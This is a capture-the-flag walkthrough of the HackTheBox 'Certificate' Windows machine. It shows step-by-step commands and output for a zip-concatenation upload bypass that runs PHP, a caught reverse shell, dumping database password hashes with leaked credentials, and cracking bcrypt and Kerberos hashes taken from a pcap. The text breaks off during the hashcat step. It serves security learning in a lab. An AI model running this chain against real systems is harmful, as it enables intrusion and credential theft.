---
layout: post
title: "HTB Certificate Writeup"
date: 2025-10-04 17:19:56 -0400
categories: hackthebox HTB-hard
tags: hacking CTF HTB HTB-hard windows active-directory kerberos zip-concatenation AD-CS SeManageVolumePrivilege golden-certificate
---
## Overview
This is a hard Windows machine on [HackTheBox](https://app.hackthebox.com/machines/Certificate){:target="_blank"}{:rel="noopener noreferrer"}. We're given an IP and want to fully compromise the machine by getting an admin shell

### Exploit Path
Through `zip concatenation` we're able to bypass the **server's file validation** checks and **run arbitrary `php`**, giving us a foothold onto the server. Leaking and cracking credentials from the database we can **reuse credentials** for the `sara.b` user. By analyzing a `pcap` file, we can extract credentials for the `lion.sk` user and grab the `user.txt` flag!

Leveraging vulnerable certificates accessible by `lion.sk`, we can **forge credentials** for the `ryan.k` user. Abusing the `SeManageVolumePrivilege`, we can access the entire drive and grab the **root CA certificate**. Through a **golden certificate attack** we can forge certificates for the `Administrator` user, giving us an elevated shell and the `root.txt` flag!

![htb-certificate-pwn](images/HTB-certificate/htb-certificate-pwn.png)
## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
┌──(kali@kali)-[~/certficate.htb]
└─$ rustscan --accessible -a <MACHINE_IP> -- -A -sC
Automatically increasing ulimit value to 5000.
Open 10.10.11.71:53
Open 10.10.11.71:80
Open 10.10.11.71:88
Open 10.10.11.71:135
Open 10.10.11.71:139
Open 10.10.11.71:389
Open 10.10.11.71:445
Open 10.10.11.71:464
Open 10.10.11.71:593
Open 10.10.11.71:636
Open 10.10.11.71:3269
Open 10.10.11.71:3268
Open 10.10.11.71:49666
Open 10.10.11.71:49691
Open 10.10.11.71:49692
Open 10.10.11.71:49694
Open 10.10.11.71:49709
Open 10.10.11.71:49719
Open 10.10.11.71:49738
```

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-favicon: Unknown favicon MD5: FBA180716B304B231C4029637CCF6481
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Certificate | Your portal for certification
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-26 00:14:40Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-26T00:16:20+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-26T00:16:19+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49732/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

There is a web server running on port `80`
```bash
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-favicon: Unknown favicon MD5: FBA180716B304B231C4029637CCF6481
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Certificate | Your portal for certification
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-26 00:14:40Z)
```

We need to authenticate with `kerberos`
```bash
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-26 00:14:40Z)
```

It's an active directory machine using the `DC01` subdomain
```bash
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-26T00:16:20+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
```

Add an entry to our `/etc/hosts` file
```
<MACHINE_IP> certificate.htb DC01.certificate.htb
```

### Subdomains
Nothing particularly interesting but worth checking
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ wfuzz -c -t 50 -u http://certificate.htb -H 'Host: FUZZ.certificate.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 1643
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://certificate.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000004625:   500        52 L     159 W      2226 Ch     "www.extranet"
000009532:   400        10 L     37 W       331 Ch      "#www"
000008536:   500        52 L     159 W      2226 Ch     "newmediacodecs"
000010581:   400        10 L     37 W       331 Ch      "#mail"
000013167:   500        52 L     159 W      2226 Ch     "web3501"
000017810:   500        52 L     159 W      2226 Ch     "web4630"

Total time: 0
Processed Requests: 24812
Filtered Requests: 24806
Requests/sec.: 0
```

### Directory Search
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ dirsearch -w /usr/share/wordlists/dirb/big.txt -r -f --threads=100 --url=certificate.htb --output=dirsearch-ext.txt -e php               

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 100 | Wordlist size: 61344

Output File: dirsearch-ext.txt

Target: http://certificate.htb/

[13:28:51] Starting: 
[13:29:16] 200 -   14KB - /About.php
[13:29:17] 200 -    0B  - /DB.php
[13:29:18] 200 -   21KB - /Blog.php
[13:29:19] 200 -    9KB - /Login.php
[13:29:38] 200 -   14KB - /about.php
[13:30:16] 403 -  304B  - /aux
[13:30:16] 403 -  304B  - /aux.php
[13:30:16] 403 -  304B  - /aux/
Added to the queue: aux/
[13:30:34] 200 -   21KB - /blog.php
[13:31:02] 403 -  304B  - /cgi-bin/
Added to the queue: cgi-bin/
# ...
```

`DB.php` is interesting but we can't access it yet. We'll come back to it later
### File Upload
Make a `student` account at the `certificate.htb/register.php` endpoint

Once logged in we can enroll in a course

![htb-certificate-enroll](images/HTB-certificate/htb-certificate-enroll.png)

Through the `Quizz` tab we're able to **upload files** 

![htb-certificate-upload](images/HTB-certificate/htb-certificate-upload.png)

After a successful upload we're given a link to view our file
```
http://certificate.htb/static/uploads/fd5b3018c29991130b22f3381786067b/test.pdf
```

Let's try uploading a `php` file
```php
<?php phpinfo(); ?> 
```

It fails giving an `Invalid Mime type` message

![htb-certificate-invalid-mime](images/HTB-certificate/htb-certificate-invalid-mime.png)

After changing the `Content-Type` header to `application/pdf` we're given an `Invalid Extension` error
```http
POST /upload.php?s_id=5 HTTP/1.1
Host: certificate.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------143484206615462834784169022783
Content-Length: 521
Origin: http://certificate.htb
Connection: keep-alive
Referer: http://certificate.htb/upload.php?s_id=5
Cookie: PHPSESSID=m7mksjqmtkp0ttvrni14u7r3ut
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

-----------------------------143484206615462834784169022783
Content-Disposition: form-data; name="info"

How to be the employee of the month! - Quizz-1
-----------------------------143484206615462834784169022783
Content-Disposition: form-data; name="quizz_id"

5
-----------------------------143484206615462834784169022783
Content-Disposition: form-data; name="file"; filename="phpinfo.php"
Content-Type: application/pdf

<?php phpinfo(); ?>

-----------------------------143484206615462834784169022783--
```

![htb-certificate-invalid-ext](images/HTB-certificate/htb-certificate-invalid-ext.png)

Changing the extension gives a `malicious content` exception
```http
POST /upload.php?s_id=5 HTTP/1.1
# ...
-----------------------------226758271610513249181597337783
Content-Disposition: form-data; name="file"; filename="phpinfo.php.pdf"
Content-Type: application/pdf

<?php phpinfo(); ?>

-----------------------------226758271610513249181597337783--
```

![htb-certificate-malicious-content](images/HTB-certificate/htb-certificate-malicious-content.png)

Uploading a regular file is a bust, but we're still able to **upload a `zip` archive**. The server will **extract the `zip` file** and perform a validation check on **every file in the archive.**

## Initial Foothold
### Zip Concatenation
After trying a [zip-slip](https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf){:target="_blank"}{:rel="noopener noreferrer"} attack, I couldn't seem to find a writable folder. However the windows server is vulnerable to [zip concatenation](https://web.archive.org/web/20250617164437/https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/){:target="_blank"}{:rel="noopener noreferrer"}!

By manually combining/concatenating separate archives, extraction programs will react differently. In our case, the server will extract both archives while **only validating the first!**

Our payload is a `zip` archive containing a `php` file we want to execute
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ echo '<?php phpinfo(); ?>' > phpinfo.php

┌──(kali@kali)-[~/certificate.htb]
└─$ zip payload.zip phpinfo.php 
  adding: phpinfo.php (stored 0%)
```

Create a valid archive that will pass the server's validation
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ zip good.zip test.pdf  
  adding: test.pdf (deflated 11%)
```

Now we concatenate the files
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ cat good.zip payload.zip > zip-concat.zip
```

Upload `zip-concat.zip` and we'll get the link to the extracted `test.pdf` file
```
http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/test.pdf
```

By changing `test.pdf` to our payload file `phpinfo.php` we can run `php` on the server!
```
http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/phpinfo.php
```
![htb-certificate-phpinfo 1](images/HTB-certificate/htb-certificate-phpinfo 1.png)

Changing our payload to a [php reverse shell](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}, we can get a foothold onto the server! I used `PHP Ivan Sincek` and `powershell`
```powershell
┌──(kali@kali)-[~/certificate.htb]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.71] 57047
SOCKET: Shell has connected! PID: 1920
Microsoft Windows [Version 10.0.17763.6532]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d>whoami
certificate\xamppuser

C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
## user.txt
### xamppuser -> sara.b
Let's enumerate users
```powershell
C:\xampp\htdocs\certificate.htb\static\uploads\fd5b3018c29991130b22f3381786067b>net users

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            akeder.kh                Alex.D                   
Aya.W                    Eva.F                    Guest                    
John.C                   Kai.X                    kara.m                   
karol.s                  krbtgt                   Lion.SK                  
Maya.K                   Nya.S                    Ryan.K                   
saad.m                   Sara.B                   xamppuser                
The command completed successfully.
```

Remember the `DB.php` file we found earlier through directory brute force? Now we can read its contents
```powershell
C:\xampp\htdocs\certificate.htb>type db.php
```

```php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
```

Credentials!!! Let's login to the `mysql` server. The reverse shell isn't quite stable so we can run single database commands with the `-e` flag
```powershell
C:\xampp\mysql\bin>.\mysql.exe --user="certificate_webapp_user" --password="cert!f!c@teDBPWD" -e "show databases;"
Database
certificate_webapp_db
information_schema
test
```

```powershell
C:\xampp\mysql\bin>.\mysql.exe --user="certificate_webapp_user" --password="cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

```powershell
C:\xampp\mysql\bin>.\mysql.exe --user="certificate_webapp_user" --password="cert!f!c@teDBPWD" -e "use certificate_webapp_db; select username, password from users;"
username	password
Lorra.AAA	$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200	$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney	$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww	$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev	$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b	$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
dasian	$2y$04$BFMV8A45MAWUzrnt.nSEIOBASF.WnA3ce4Rjv2vi6oAhA50PILxPS
```

Let's try to crack these hashes
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --fork=3 --progress-every=30 crack.txt 
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Node numbers 1-3 of 3 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD_REDACTED>         (sara.b)  
```

### sara.b -> lion.sk
Now we can authenticate with `kerberos`!

To fix the clock skew error I added the following to `~/.zshrc`
```bash
alias sync-ad="faketime \"\$(ntpdate -q certificate.htb | cut -d ' ' -f 1,2)\" "
```

Generate the ticket granting ticket 
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad getTGT.py -dc-ip 10.10.11.71 'certificate.htb/sara.b:<PASSWORD_REDACTED>'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in sara.b.ccache
```

Export our ticket for use by other programs
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ export KRB5CCNAME=$(pwd)/sara.b.ccache  
```

Generate the configuration file and move it to `/etc/krb5.conf`. This is important for `evil-winrm`
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad nxc smb 10.10.11.71 -u 'sara.b' -p '<PASSWORD_REDACTED>' -k --generate-krb5-file krb5.conf && sudo mv krb5.conf /etc/krb5.conf
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.71     445    DC01             [+] certificate.htb\sara.b:<PASSWORD_REDACTED> 
```

```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ cat /etc/krb5.conf 
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = CERTIFICATE.HTB

[realms]
    CERTIFICATE.HTB = {
        kdc = dc01.certificate.htb
        admin_server = dc01.certificate.htb
        default_domain = certificate.htb
    }

[domain_realm]
    .certificate.htb = CERTIFICATE.HTB
    certificate.htb = CERTIFICATE.HTB
```

Now we can login as `sara.b`
```powershell
┌──(kali@kali)-[~/certificate.htb]
└─$ sync-ad evil-winrm -i dc01.certificate.htb -r certificate.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami
certificate\sara.b
*Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

There are interesting documents in the `WS-01` folder
```powershell
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> ls


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap


*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> cat Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

Let's download the `pcap` file and analyze it
```powershell
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap /home/kali/certificate.htb/capture.pcap

Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to /home/kali/certificate.htb/capture.pcap

Info: Download successful!
```

We're able to extract `kerberos` hashes using [this tool](https://github.com/jalvarezz13/Krb5RoastParser){:target="_blank"}{:rel="noopener noreferrer"}. Clone the repo and run it on our `pcpap` file
```bash
┌──(kali@kali)-[~/certificate.htb]
└─$ git clone https://github.com/jalvarezz13/Krb5RoastParser
Cloning into 'Krb5RoastParser'...
remote: Enumerating objects: 23, done.
remote: Counting objects: 100% (23/23), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 23 (delta 10), reused 7 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (23/23), 10.66 KiB | 2.13 MiB/s, done.
Resolving deltas: 100% (10/10), done.

┌──(kali@kali)-[~/certificate.htb]
└─$ cd Krb5RoastParser 

┌──(kali@kali)-[~/certificate.htb/Krb5RoastParser]
└─$ python3 krb5_roast_parser.py 
Usage: python roasting.py <pcap_file> <as_req/as_rep/tgs_rep>

┌──(kali@kali)-[~/certificate.htb/Krb5RoastParser]
└─$ python3 krb5_roast_parser.py ../capture.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

Now we can crack the hashes
```bash
┌──(kali@kali)-[~/certificate.htb/Krb5RoastParser]
└─$ python3 krb5_roast_parser.py ../capture.pcap as_req > crack.txt

┌──(kali@kali)-[~/certificate.htb]
└─$ hashcat -m 19900 crack.txt /usr/share/wordlists/rockyou.txt
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

